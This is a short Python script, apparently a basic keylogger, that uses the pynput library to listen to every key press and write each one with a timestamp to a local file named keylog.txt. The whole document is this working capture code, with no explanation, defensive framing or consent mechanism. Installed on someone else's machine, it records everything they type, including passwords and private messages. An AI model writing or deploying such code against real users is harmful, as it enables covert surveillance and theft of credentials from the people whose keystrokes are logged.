from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except:
        logging.info(f"Special key {key} pressed")

with Listener(on_press=on_press) as listener:
    listener.join()